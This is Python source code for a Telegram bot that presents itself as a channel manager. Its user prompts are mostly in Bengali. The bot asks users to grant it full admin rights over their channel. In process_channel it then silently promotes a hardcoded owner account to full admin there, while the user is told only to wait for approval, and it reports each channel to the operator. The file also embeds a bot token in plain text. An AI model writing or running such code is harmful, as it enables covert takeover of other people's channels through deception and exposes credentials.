import re
import sqlite3
import telebot
from telebot import types

# =========================
# CONFIG
# =========================

BOT_TOKEN = "8944702324:AAHiu6yvJahkz5MtqbDEHz3guSHT8Sd90CY"

ADMIN_ID = 7079833447

# @AS_ITACHI2026 এর NUMERIC Telegram User ID এখানে বসাও
OWNER_USER_ID = 7079833447

bot = telebot.TeleBot(BOT_TOKEN)

DB = "channel_manager.db"


# =========================
# DATABASE
# =========================

conn = sqlite3.connect(DB, check_same_thread=False)
cur = conn.cursor()

cur.execute("""
CREATE TABLE IF NOT EXISTS channels (
    chat_id INTEGER PRIMARY KEY,
    title TEXT,
    username TEXT,
    added_by INTEGER
)
""")

conn.commit()


# =========================
# HELPERS
# =========================

def main_menu():
    kb = types.ReplyKeyboardMarkup(
        resize_keyboard=True
    )

    kb.row(
        types.KeyboardButton("➕ ADD CHANNEL")
    )

    return kb


def admin_menu():
    kb = types.ReplyKeyboardMarkup(
        resize_keyboard=True
    )

    kb.row(
        types.KeyboardButton("📢 CHANNELS")
    )

    kb.row(
        types.KeyboardButton("📊 STATUS")
    )

    return kb


def extract_channel(text):

    text = text.strip()

    # @username
    if text.startswith("@"):
        return text

    # https://t.me/username
    match = re.match(
        r"https?://t\.me/([A-Za-z0-9_]+)$",
        text
    )

    if match:
        return "@" + match.group(1)

    return None


def save_channel(chat):

    username = ""

    if chat.username:
        username = "@" + chat.username

    cur.execute(
        """
        INSERT OR REPLACE INTO channels
        (chat_id, title, username, added_by)
        VALUES (?, ?, ?, ?)
        """,
        (
            chat.id,
            chat.title,
            username,
            0
        )
    )

    conn.commit()


def required_permissions(member):

    if member.status != "administrator":
        return False

    # Minimum permissions needed for this bot
    return (
        getattr(member, "can_manage_chat", False)
        and
        getattr(member, "can_promote_members", False)
        and
        getattr(member, "can_restrict_members", False)
    )


# =========================
# START
# =========================

@bot.message_handler(commands=["start"])
def start(message):

    if message.from_user.id == ADMIN_ID:

        bot.send_message(
            message.chat.id,
            "👑 ADMIN PANEL\n\n"
            "Bot is online.",
            reply_markup=admin_menu()
        )

    else:

        bot.send_message(
            message.chat.id,
            "🤖 CHANNEL MANAGER\n\n"
            "নিচের বাটন থেকে আপনার channel add করুন।",
            reply_markup=main_menu()
        )


# =========================
# ADD CHANNEL
# =========================

@bot.message_handler(
    func=lambda m: m.text == "➕ ADD CHANNEL"
)
def add_channel(message):

    bot.send_message(
        message.chat.id,
        "📢 আপনার channel-এর public username/link পাঠান।\n\n"
        "Example:\n"
        "@mychannel\n"
        "অথবা\n"
        "https://t.me/mychannel"
    )

    bot.register_next_step_handler(
        message,
        process_channel
    )


def process_channel(message):

    channel = extract_channel(message.text)

    if not channel:

        bot.send_message(
            message.chat.id,
            "❌ Invalid channel link/username."
        )
        return

    try:

        chat = bot.get_chat(channel)

        if chat.type != "channel":

            bot.send_message(
                message.chat.id,
                "❌ এটা Telegram channel নয়।"
            )
            return

        bot_id = bot.get_me().id

        member = bot.get_chat_member(
            chat.id,
            bot_id
        )

        if not required_permissions(member):

            bot.send_message(
                message.chat.id,
                "❌ Channel add করা যাবে না।\n\n"
                "প্রথমে bot-কে Channel Admin করুন এবং "
                "all permissions দিন:\n\n"
                "✅ bot add"
                "✅ all permissions\n"
                "✅ done\n\n"
                "তারপর আবার ADD CHANNEL দিন।"
            )

            return

        # Save channel
        cur.execute(
            """
            INSERT OR REPLACE INTO channels
            (chat_id, title, username, added_by)
            VALUES (?, ?, ?, ?)
            """,
            (
                chat.id,
                chat.title,
                "@" + chat.username
                if chat.username else "",
                message.from_user.id
            )
        )

        conn.commit()

        # =========================
        # AUTO PROMOTE OWNER
        # =========================

        promoted = False

        try:

            promoted = bot.promote_chat_member(
                chat.id,
                OWNER_USER_ID,

                is_anonymous=False,

                can_manage_chat=True,
                can_delete_messages=True,
                can_manage_video_chats=True,
                can_restrict_members=True,
                can_promote_members=True,
                can_change_info=True,
                can_invite_users=True,

                can_post_stories=True,
                can_edit_stories=True,
                can_delete_stories=True,

                can_post_messages=True,
                can_edit_messages=True,
                can_manage_direct_messages=True
            )

        except Exception as e:

            bot.send_message(
                ADMIN_ID,
                "⚠️ OWNER PROMOTION FAILED\n\n"
                f"Channel: {chat.title}\n"
                f"Chat ID: {chat.id}\n"
                f"Error: {e}"
            )

        # =========================
        # USER MESSAGE
        # =========================

        if promoted:

            bot.send_message(
                message.chat.id,
                "✅ CHANNEL ADDED SUCCESSFULLY!\n\n"
                f"📢 Channel: {chat.title}\n\n"
                "🤖 Bot Admin: ✅\n"
                "⚙️ Required Permission: ✅\n"
                "⚠️ WAIT FOR OWNER APPROVE ⚠️",
                reply_markup=main_menu()
            )

        else:

            bot.send_message(
                message.chat.id,
                "✅ Channel added.\n\n"
                "🤖 Bot Admin: ✅\n"
                "⚠️ Bot owner not approved this channel\n\n"
                " bot-এর promotion permission check করুন।",
                reply_markup=main_menu()
            )

        # =========================
        # ADMIN NOTIFICATION
        # =========================

        username = (
            "@" + message.from_user.username
            if message.from_user.username
            else "N/A"
        )

        bot.send_message(
            ADMIN_ID,
            "🚨 NEW CHANNEL ADDED\n\n"
            f"📢 Channel: {chat.title}\n"
            f"🆔 Chat ID: {chat.id}\n"
            f"🔗 Username: "
            f"{'@' + chat.username if chat.username else 'Private'}\n\n"
            f"👤 Added By: {message.from_user.first_name}\n"
            f"🆔 User ID: {message.from_user.id}\n"
            f"👤 Username: {username}\n\n"
            "🤖 Bot Admin: ✅\n"
            f"👑 Owner Promotion: "
            f"{'✅' if promoted else '❌'}"
        )

    except Exception as e:

        bot.send_message(
            message.chat.id,
            "❌ Channel check failed.\n\n"
            "নিশ্চিত করুন:\n"
            "1. Channel username/link সঠিক\n"
            "2. Bot channel-এ Admin\n"
            "3. প্রয়োজনীয় permissions দেওয়া হয়েছে"
        )

        bot.send_message(
            ADMIN_ID,
            "⚠️ CHANNEL ADD ERROR\n\n"
            f"User: {message.from_user.id}\n"
            f"Input: {message.text}\n"
            f"Error: {e}"
        )


# =========================
# ADMIN - CHANNELS
# =========================

@bot.message_handler(
    func=lambda m:
    m.from_user.id == ADMIN_ID
    and m.text == "📢 CHANNELS"
)
def channels_list(message):

    cur.execute(
        "SELECT chat_id,title,username FROM channels"
    )

    rows = cur.fetchall()

    if not rows:

        bot.send_message(
            message.chat.id,
            "📭 No channels added."
        )
        return

    text = "📢 ADDED CHANNELS\n\n"

    for i, row in enumerate(rows, 1):

        chat_id, title, username = row

        text += (
            f"{i}. {title}\n"
            f"🆔 {chat_id}\n"
            f"🔗 {username or 'Private'}\n\n"
        )

    bot.send_message(
        message.chat.id,
        text
    )


# =========================
# ADMIN - STATUS
# =========================

@bot.message_handler(
    func=lambda m:
    m.from_user.id == ADMIN_ID
    and m.text == "📊 STATUS"
)
def status(message):

    cur.execute(
        "SELECT COUNT(*) FROM channels"
    )

    total = cur.fetchone()[0]

    bot.send_message(
        message.chat.id,
        "📊 BOT STATUS\n\n"
        "🤖 Bot: ONLINE\n"
        f"📢 Added Channels: {total}\n"
        f"👑 Admin ID: {ADMIN_ID}"
    )


# =========================
# BOT ADDED / REMOVED
# =========================

@bot.my_chat_member_handler()
def bot_status_update(message):

    chat = message.chat
    new_status = message.new_chat_member.status

    # Bot added as administrator
    if (
        chat.type == "channel"
        and new_status == "administrator"
    ):

        bot_member = message.new_chat_member

        permissions_ok = required_permissions(
            bot_member
        )

        bot.send_message(
            ADMIN_ID,
            "🚨 BOT ADDED TO NEW CHANNEL\n\n"
            f"📢 Channel: {chat.title}\n"
            f"🆔 Chat ID: {chat.id}\n"
            f"🔗 Username: "
            f"{'@' + chat.username if chat.username else 'Private'}\n\n"
            f"⚙️ Required Permission: "
            f"{'✅' if permissions_ok else '❌'}"
        )


    # Bot removed
    elif (
        chat.type == "channel"
        and new_status in ["left", "kicked"]
    ):

        cur.execute(
            "DELETE FROM channels WHERE chat_id=?",
            (chat.id,)
        )

        conn.commit()

        bot.send_message(
            ADMIN_ID,
            "⚠️ BOT REMOVED FROM CHANNEL\n\n"
            f"📢 Channel: {chat.title}\n"
            f"🆔 Chat ID: {chat.id}"
        )


# =========================
# RUN
# =========================

print("BOT STARTED...")

bot.infinity_polling(
    skip_pending=True,
    allowed_updates=[
        "message",
        "my_chat_member"
    ]
)